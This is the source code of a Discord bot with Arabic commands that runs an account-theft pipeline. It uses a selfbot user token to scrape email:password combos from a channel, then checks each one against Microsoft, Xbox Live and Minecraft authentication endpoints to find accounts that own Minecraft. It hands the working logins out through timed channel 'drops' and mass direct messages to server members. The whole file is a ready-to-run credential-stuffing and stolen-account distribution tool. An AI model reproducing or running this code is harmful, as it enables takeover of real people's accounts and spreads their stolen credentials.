require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, Partials } = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');
const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const mineflayer = require('mineflayer');
const fs = require('fs');
const path = require('path');

// Wrap axios to support cookies
const axiosInstance = wrapper(axios.create({ withCredentials: true }));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ],
    partials: [Partials.Channel]
});

// --- ⚙️ الإعدادات الثابتة ---
const ALLOWED_USERS = ["1462575612085538828", "1130516001495208046"];
const USER_TOKEN = process.env.USER_TOKEN;
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const SCRAPE_CHANNEL_ID = "1436351424999985162";

const ACCOUNTS_FILE = path.join(__dirname, 'combos.txt');
const SERVERS_FILE = path.join(__dirname, 'servers.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');
const PREFIX = '$';

let dropTimer = null;
let botConfig = {};

const defaultConfig = {
    dropChannel: null,
    interval: 300000,
    totalToScrape: 100,
    drop_accounts: []
};

// --- إدارة الملفات ---
function loadTXT(file) {
    if (!fs.existsSync(file)) return [];
    try {
        const d = fs.readFileSync(file, 'utf8');
        return d.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch (e) { return []; }
}
function saveTXT(file, data) {
    try { fs.writeFileSync(file, data.join('\n'), 'utf8'); } catch (e) { }
}
function loadJSON(file) {
    if (!fs.existsSync(file)) return [];
    try { const d = fs.readFileSync(file, 'utf8'); return d ? JSON.parse(d) : []; } catch (e) { return []; }
}
function saveJSON(file, data) {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 4)); } catch (e) { }
}
function loadBotConfig() {
    let configData = loadJSON(CONFIG_FILE);
    if (!configData || Object.keys(configData).length === 0) {
        saveJSON(CONFIG_FILE, defaultConfig);
        return defaultConfig;
    }
    for (const key in defaultConfig) {
        if (!configData.hasOwnProperty(key)) configData[key] = defaultConfig[key];
    }
    saveJSON(CONFIG_FILE, configData);
    return configData;
}
function saveBotConfig(configData) { saveJSON(CONFIG_FILE, configData); }

function shuffleArray(arr) {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
}

// --- ThunderMC Exact Logic (Node.js Implementation) ---
const sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

function lr_parse(text, start, end, create_empty = true) {
    try {
        const startIndex = text.indexOf(start);
        if (startIndex === -1) return create_empty ? "" : null;
        const subText = text.substring(startIndex + start.length);
        if (end === "") return subText;
        const endIndex = subText.indexOf(end);
        if (endIndex === -1) return create_empty ? "" : null;
        return subText.substring(0, endIndex);
    } catch (e) { return create_empty ? "" : null; }
}

async function authenticateMinecraftAccount(email, password) {
    const jar = new CookieJar();
    const session = axiosInstance;
    const commonHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9'
    };

    try {
        // Step 1: Get sFTTag and urlPost
        console.log(`[CHECKER] Starting auth for ${email}...`);
        const r1 = await session.get(sFTTag_url, { jar, headers: commonHeaders, timeout: 20000 });
        const sFTTagMatch = r1.data.match(/sFTTag:'(.+?)'/);
        const urlPostMatch = r1.data.match(/urlPost:'(.+?)'/);

        if (!sFTTagMatch || !urlPostMatch) {
            console.error(`[CHECKER] Failed to parse sFTTag/urlPost for ${email}`);
            return { success: false, reason: "Parse Error" };
        }
        const sFTTag = sFTTagMatch[1];
        const urlPost = urlPostMatch[1];

        // Step 2: Post credentials
        const payload = new URLSearchParams({
            login: email,
            loginfmt: email,
            passwd: password,
            PPFT: sFTTag
        }).toString();
        
        const r2 = await session.post(urlPost, payload, {
            jar,
            headers: { 
                ...commonHeaders,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        });

        let redirectUrl = r2.headers.location || "";
        
        // Handle intermediate redirects if any
        if (r2.status === 302 && !redirectUrl.includes('access_token')) {
            const r2_sub = await session.get(redirectUrl, { jar, headers: commonHeaders, maxRedirects: 5, validateStatus: status => status < 400 });
            redirectUrl = r2_sub.request.res.responseUrl || "";
        }

        if (redirectUrl.includes('identity/confirm') || redirectUrl.includes('Abuse') || redirectUrl.includes('fmacc')) {
            console.log(`[CHECKER] 2FA/Abuse detected for ${email}`);
            return { success: false, reason: "2FA/Abuse" };
        }

        if (redirectUrl.includes('access_token=')) {
            const accessToken = lr_parse(redirectUrl, 'access_token=', '&');
            
            // Step 3: Xbox Live Auth
            const r3 = await session.post('https://user.auth.xboxlive.com/user/authenticate', {
                Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${accessToken}` },
                RelyingParty: "http://auth.xboxlive.com/", TokenType: "JWT"
            }, { jar, headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } });

            const xboxToken = r3.data.Token;
            const uhs = r3.data.DisplayClaims.xui[0].uhs;

            // Step 4: XSTS Auth
            const r4 = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', {
                Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
                RelyingParty: "rp://api.minecraftservices.com/", TokenType: "JWT"
            }, { 
                jar, 
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                validateStatus: status => status < 500
            });

            if (r4.status !== 200) {
                console.log(`[CHECKER] XSTS Failed for ${email}: ${r4.data.XErr}`);
                return { success: false, reason: "XSTS Error" };
            }
            const xstsToken = r4.data.Token;

            // Step 5: Minecraft Login
            const r5 = await session.post('https://api.minecraftservices.com/authentication/login_with_xbox', {
                identityToken: `XBL3.0 x=${uhs};${xstsToken}`
            }, { jar, headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } });

            const mcToken = r5.data.access_token;

            // Step 6: Entitlements Check
            const r6 = await session.get('https://api.minecraftservices.com/entitlements/license', {
                jar,
                headers: { 'Authorization': `Bearer ${mcToken}` }
            });

            const items = r6.data.items || [];
            const hasMc = items.some(i => ["game_minecraft", "product_minecraft"].includes(i.name));
            
            if (hasMc) {
                console.log(`[CHECKER] SUCCESS: ${email} has Minecraft!`);
                return { success: true, reason: "Success" };
            } else {
                console.log(`[CHECKER] FAILED: ${email} has NO Minecraft entitlement.`);
                return { success: false, reason: "No Entitlement" };
            }
        }
        
        console.log(`[CHECKER] FAILED: ${email} - Invalid credentials or unknown redirect.`);
        return { success: false, reason: "Invalid Login" };

    } catch (e) {
        console.error(`[CHECKER] ERROR for ${email}:`, e.message);
        if (e.response) console.error(`[CHECKER] Response Status: ${e.response.status}, Data:`, e.response.data);
        return { success: false, reason: e.message };
    }
}

// --- Bot Logic ---
client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    botConfig = loadBotConfig();
    if (botConfig.dropChannel && botConfig.interval > 0) startDropTimer();
});

function startDropTimer() {
    if (dropTimer) clearInterval(dropTimer);
    dropTimer = setInterval(async () => {
        const channel = client.channels.cache.get(botConfig.dropChannel);
        if (!channel || !botConfig.drop_accounts?.length) return;
        const acc = shuffleArray(botConfig.drop_accounts)[0];
        const [e, p] = acc.split(':');
        const embed = new EmbedBuilder().setTitle('🎁 حساب جديد!').setColor('#00ff00')
            .addFields({ name: 'Email', value: e, inline: true }, { name: 'Pass', value: p, inline: true })
            .setFooter({ text: 'استمتع بحسابك الجديد!' });
        try { await channel.send({ embeds: [embed] }); } catch (err) { }
    }, botConfig.interval);
}

function stopDropTimer() { if (dropTimer) { clearInterval(dropTimer); dropTimer = null; } }

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    if (!ALLOWED_USERS.includes(message.author.id)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    if (cmd === 'help') {
        const embed = new EmbedBuilder().setColor('#3498db').setTitle('🛠️ لوحة تحكم Sopra المحدثة')
            .addFields(
                { name: '🔍 الفحص', value: '`$فحص`: فحص حسابات Minecraft وتحديث combos.txt.' },
                { name: '📥 السحب والستوك', value: '`$start`: سحب من القناة.\n`$stock`: عرض الكمية.\n`$رسائل [عدد]`: تحديد كمية السحب.' },
                { name: '📩 الإرسال', value: '`$sent @user [عدد]`: إرسال حسابات لشخص.\n`$sent all [عدد]`: توزيع عشوائي سريع جداً.' },
                { name: '🎁 التوزيع (Drop)', value: '`$drop`: بدء.\n`$stopdrop`: إيقاف.\n`$روم [ID]`: تحديد قناة.\n`$وقت [ثواني]`: تحديد زمن الدروب.' },
                { name: '🗑️ الحذف', value: '`$reset`: مسح كل البيانات.' }
            );
        message.channel.send({ embeds: [embed] });
    }

    if (cmd === 'start') {
        const totalToScrape = botConfig.totalToScrape || 100;
        const self = new SelfClient({ checkUpdate: false });
        try {
            await self.login(USER_TOKEN);
            const channel = await self.channels.fetch(SCRAPE_CHANNEL_ID);
            const statusMsg = await message.reply(`⏳ جاري السحب من القناة (الهدف: **${totalToScrape}** رسالة)...`);
            let lastId = null, newCount = 0, messagesFetched = 0;
            let accounts = loadTXT(ACCOUNTS_FILE);
            while (messagesFetched < totalToScrape) {
                const messages = await channel.messages.fetch({ limit: Math.min(10, totalToScrape - messagesFetched), before: lastId });
                if (messages.size === 0) break;
                for (const msg of messages.values()) {
                    let content = msg.content + (msg.embeds[0]?.description || "") + (msg.embeds[0]?.fields?.map(f => f.name + f.value).join("") || "");
                    content = content.replace(/\|\|/g, "");
                    const match = content.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}):([^\s]+)/);
                    if (match) {
                        const entry = `${match[1].trim().toLowerCase()}:${match[2].trim()}`;
                        if (!accounts.includes(entry)) { accounts.push(entry); newCount++; }
                    }
                }
                messagesFetched += messages.size;
                lastId = messages.last().id;
                if (messagesFetched % 20 === 0) await statusMsg.edit(`⏳ جاري السحب... تم فحص **${messagesFetched}/${totalToScrape}** رسالة. أُضيف: **${newCount}**.`);
            }
            saveTXT(ACCOUNTS_FILE, accounts);
            statusMsg.edit(`✅ تم السحب بنجاح! أضيفت **${newCount}** حسابات جديدة.`);
        } catch (e) { message.reply(`❌ خطأ: ${e.message}`); } finally { self.destroy(); }
    }

    if (cmd === 'فحص') {
        let accounts = loadTXT(ACCOUNTS_FILE);
        if (accounts.length === 0) return message.reply("❌ الستوك فارغ.");
        const statusMsg = await message.reply(`⏳ فحص **${accounts.length}** حساب بمنطق ThunderMC...`);
        let validAccounts = [], checkedCount = 0;
        for (let i = 0; i < accounts.length; i++) {
            const [email, pass] = accounts[i].split(':');
            const { success } = await authenticateMinecraftAccount(email, pass);
            checkedCount++;
            if (success) validAccounts.push(accounts[i]);
            if (checkedCount % 5 === 0 || checkedCount === accounts.length) {
                await statusMsg.edit(`⏳ جاري الفحص: (${checkedCount}/${accounts.length}) | ✅ شغال: ${validAccounts.length}`);
            }
            await new Promise(r => setTimeout(r, 1000)); // Delay to be safe
        }
        saveTXT(ACCOUNTS_FILE, validAccounts);
        await statusMsg.edit(`✅ اكتمل الفحص! تم تحديث combos.txt بـ **${validAccounts.length}** حساب شغال.`);
    }

    if (cmd === 'stock') message.reply(`الستوك الحالي: **${loadTXT(ACCOUNTS_FILE).length}** حساب.`);
    if (cmd === 'رسائل') {
        const count = parseInt(args[0]);
        if (count > 0) { botConfig.totalToScrape = count; saveBotConfig(botConfig); message.reply(`تم التحديد إلى **${count}**.`); }
    }
    if (cmd === 'drop') { startDropTimer(); message.reply("بدء الدروب."); }
    if (cmd === 'stopdrop') { stopDropTimer(); message.reply("تم الإيقاف."); }
    if (cmd === 'روم') {
        if (args[0]) { botConfig.dropChannel = args[0]; saveBotConfig(botConfig); message.reply("تم تحديد القناة."); }
    }
    if (cmd === 'وقت') {
        const sec = parseInt(args[0]);
        if (sec > 0) { botConfig.interval = sec * 1000; saveBotConfig(botConfig); message.reply("تم تحديد الوقت."); }
    }
    if (cmd === 'reset') {
        saveTXT(ACCOUNTS_FILE, []);
        saveJSON(SERVERS_FILE, []);
        saveJSON(CONFIG_FILE, defaultConfig);
        botConfig = defaultConfig;
        stopDropTimer();
        message.reply("✅ تم التصفير.");
    }
    
    if (cmd === 'sent') {
        if (args[0]?.toLowerCase() === 'all') {
            const poolSize = parseInt(args[1]) || 1;
            const guild = message.guild;
            if (!guild) return;
            await guild.members.fetch();
            const onlineMembers = Array.from(guild.members.cache.filter(m => !m.user.bot && m.presence?.status !== 'offline').values());
            let accounts = loadTXT(ACCOUNTS_FILE);
            if (accounts.length === 0) return message.reply("❌ الستوك فارغ.");
            const statusMsg = await message.reply("جاري الإرسال للجميع...");
            const shuffledPool = shuffleArray(accounts).slice(0, Math.min(poolSize, accounts.length));
            let success = 0, fail = 0;
            for (const member of onlineMembers) {
                const acc = shuffledPool[Math.floor(Math.random() * shuffledPool.length)];
                const [e, p] = acc.split(':');
                const embed = new EmbedBuilder().setColor('#f1c40f').setTitle('🎮 Account')
                    .setDescription(`من **${message.guild.name}**`)
                    .addFields({ name: 'Email', value: e, inline: true }, { name: 'Pass', value: p, inline: true });
                try { await member.send({ embeds: [embed] }); success++; } catch { fail++; }
                await new Promise(r => setTimeout(r, 100));
            }
            await statusMsg.edit(`✅ انتهى: وصلت لـ **${success}** | فشل لـ **${fail}**`);
        } else {
            const target = message.mentions.users.first();
            if (!target) return;
            const count = parseInt(args[1]) || 1;
            let accounts = loadTXT(ACCOUNTS_FILE);
            const selected = shuffleArray(accounts).slice(0, Math.min(count, accounts.length));
            for (const acc of selected) {
                const [e, p] = acc.split(':');
                const embed = new EmbedBuilder().setColor('#f1c40f').setTitle('🎮 Account')
                    .addFields({ name: 'Email', value: e, inline: true }, { name: 'Pass', value: p, inline: true });
                try { await target.send({ embeds: [embed] }); } catch { }
            }
            message.reply("✅ تم الإرسال.");
        }
    }
});

client.login(DISCORD_BOT_TOKEN);
